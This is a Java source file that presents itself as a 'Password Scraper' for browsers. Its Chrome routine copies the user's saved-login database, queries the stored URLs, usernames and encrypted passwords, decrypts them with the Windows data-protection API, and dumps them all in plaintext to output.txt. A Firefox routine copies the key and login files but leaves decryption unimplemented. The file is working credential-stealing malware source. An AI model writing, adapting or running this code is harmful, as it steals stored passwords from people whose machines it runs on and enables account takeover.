// Password Scraper for Chrome/Firefox/IE for Windows/Linux/Mac
import java.util.*;
import java.util.Base64;
import java.util.Base64.Decoder;

import javax.crypto.Cipher;

// Apache Libs
import org.apache.commons.io.FileUtils;

// WIN32 Native Functions
import com.sun.jna.platform.win32.*;

// Standard Java IO
import java.io.File;
import java.io.IOException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.PrintStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.GeneralSecurityException;
import java.security.KeyStore;
// SQLite libraries
import java.sql.DriverManager;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

// Libraries for Handling JSON
import org.json.JSONArray;
import org.json.JSONObject;
import org.json.simple.parser.JSONParser;
import org.json.simple.parser.ParseException;

// Mozilla Security Suite for Java
import org.mozilla.jss.*;
import org.mozilla.jss.CryptoManager.NotInitializedException;
import org.mozilla.jss.crypto.AlreadyInitializedException;
import org.mozilla.jss.crypto.CryptoToken;
import org.mozilla.jss.crypto.SecretDecoderRing;
import org.mozilla.jss.crypto.SymmetricKey;
import org.mozilla.jss.crypto.TokenException;
import org.mozilla.jss.pkcs11.KeyType;

// Sun InfoSec Libs
import sun.security.pkcs11.*;

public class jdec extends Crypt32Util {
	
	public static void ChromeDec() throws IOException, SQLException {
		
		// Get username
		String user = System.getProperty("user.name");
		
		// Chrome
		File chrome = FileUtils.getFile("C:/Users/" + user + "/AppData/Local/Google/Chrome/User Data/Default/Login Data");
		File chromedest = FileUtils.getFile("logindata.db");
		FileUtils.copyFile(chrome, chromedest);
	
		Connection conn = null;

		// Use arguments string for db url
		String url = "jdbc:sqlite:logindata.db";
		conn = DriverManager.getConnection(url);

		// SQL Queries
		Statement stmt1 = conn.createStatement();
		Statement stmt2 = conn.createStatement();
		Statement stmt3 = conn.createStatement();
		Statement stmt4 = conn.createStatement();
		String sqlurls = "SELECT origin_url FROM logins ";
		String sqlusernames = "SELECT username_value FROM logins ORDER BY username_value";
		String sqlpassblobs = "SELECT password_value FROM logins ORDER BY username_value";
		String count = "SELECT COUNT(username_value) FROM logins";
		ResultSet dbcount = stmt4.executeQuery(count);
		int cint = dbcount.getInt(1);
	
		ArrayList<byte[]> bytearray = new ArrayList<byte[]>();
	
		ResultSet rsurls = stmt1.executeQuery(sqlurls);
		ResultSet rsusernames = stmt2.executeQuery(sqlusernames);
		ResultSet rspassblobs = stmt3.executeQuery(sqlpassblobs);
	
		// URLs into String array
		int urint = 0;
		String[] urls = new String[cint];
		while(urint!=cint){
		urls[urint] = rsurls.getString(1);
		rsurls.next();
		urint++;
		}
	
		// Usernames into String array
		int unint = 0;
		String[] usernames = new String[cint];
		while(unint!=cint) {
		usernames[unint] = rsusernames.getString(1);
		rsusernames.next();
		unint++;
		}
	
		int pint = 0;
		// Putting BLOBs into byte array
		while(pint!=cint) {
		bytearray.add(rspassblobs.getBytes(1));
		rspassblobs.next();
		pint++;
		}
	
		ArrayList<byte[]> unencrypted = new ArrayList<byte[]>();
		int x = 0;
	
		// Decrypt data
		while(x != cint) {
			unencrypted.add(cryptUnprotectData(bytearray.get(x), 0));
			x++;
		}
	
		// Put decrypted passwords into string array
		String[] passwords = new String[cint];
		for(int y = 0; y < cint; y++) {
			passwords[y] = new String(unencrypted.get(y), "UTF-8");
		}
	
		// Print results
		for(int i = 0; i < cint; i++) {
		System.out.println(urls[i] + " -- " + usernames[i] + " -- " + passwords[i]);
		}
	}
	
	public static void FirefoxDec() throws IOException, ParseException, KeyDatabaseException, CertDatabaseException, AlreadyInitializedException, GeneralSecurityException, TokenException, NotInitializedException {
		
		// Get username
		String user = System.getProperty("user.name");

		// Firefox -- Uses a decryption key in the Mozilla folder which we need to use, password file is in JSON format
		File firefoxloc = FileUtils.getFile("C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles");
		String[] fuckfirefox = firefoxloc.list();
		String userloc = new String();
	
		// Search for profile default login, potentially other usernames but most people will use default Firefox profile
		for(String directory : fuckfirefox){
			if(directory.contains(".default")){
				userloc = directory;
			}
		}
	
		// Get Key File
		File firefox = FileUtils.getFile("C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles/" + userloc + "/key3.db");
		File firefoxkeydest = FileUtils.getFile("key3.db");
		FileUtils.copyFile(firefox, firefoxkeydest);
		
		// Get JSON file, hashes in plaintext
		File firefoxjson = FileUtils.getFile("C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles/" + userloc + "/logins.json");
		File firefoxjdest = FileUtils.getFile("logins.json");
		FileUtils.copyFile(firefoxjson, firefoxjdest);
		
		// Parse
		JSONParser parser = new JSONParser();
		Object jffobj = parser.parse(new FileReader("logins.json"));
		String ffdata = jffobj.toString();
		JSONObject ffobj = new JSONObject(ffdata);
		JSONArray logins = ffobj.getJSONArray("logins");
		
		// Put into arrays
		
		// URLS
		ArrayList<String> ffurls = new ArrayList<String>();
		// Encrypted Usernames + Passwords
		ArrayList<String> ffencryptedusernames = new ArrayList<String>();
		ArrayList<String> ffencryptedpasswords = new ArrayList<String>();
		// Decrypted Usernames + Passwords
		ArrayList<String> ffdecryptedusernames = new ArrayList<String>();
		ArrayList<String> ffdecryptedpasswords = new ArrayList<String>();
		
		// Get websites
		for(int j = 0; j < logins.length(); j++){
			ffurls.add(logins.getJSONObject(j).getString("hostname"));
		}
		
		// Get encrypted usernames
		for(int j = 0; j < logins.length(); j++){
			ffencryptedusernames.add(logins.getJSONObject(j).getString("encryptedUsername"));
		}
		
		// Get encrypted passwords
		for(int j = 0; j < logins.length(); j++){
			ffencryptedpasswords.add(logins.getJSONObject(j).getString("encryptedPassword"));
		}
		
		// Firefox uses Public-Key Cryptography Standards#11 (PKCS#11)
		// There's a NSS library that originates from Netscape when the
		// SSL security protocol was invented.
		// Mozilla created a interface called JSS that allows developers
		// to interact with this library.
		
		CryptoManager.initialize("C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles/" + userloc + "/key3.db");
		
		// Parse key3.db to decode DES3 encrypted usernames and passwords with JSS
		Path keypath = Paths.get("key3.db");
		byte[] key = Files.readAllBytes(keypath);
		
		// Need to create a token using the key3.db and pass it to the KeyManager
		// Then Decrypt using key3.db and Base64?
		
		// Turns out I need to build JSS with C++ libs, ughhhhhhhhhhhhhhhh MOZILLAAAAA
		
		// Declare Base64 Decoder
		Base64.Decoder dec = Base64.getDecoder();
		
		System.out.println("Firefox usernames and passwords: ");
		
		for(String username : ffencryptedusernames){

		}
		
		for(String password : ffencryptedpasswords){
			//ffdecryptedpasswords.add(Base64.decodeBase64(password).toString());
		}
		
	}
	
	public static void main(String[] args) throws SQLException, IOException, ParseException, KeyDatabaseException, CertDatabaseException, AlreadyInitializedException, GeneralSecurityException, TokenException, NotInitializedException {
		
		// Redirect output to text file
		PrintStream out = new PrintStream(new FileOutputStream("output.txt"));
		System.setOut(out);
		
		ChromeDec();
		FirefoxDec();
		System.out.println("Done");
	}
}
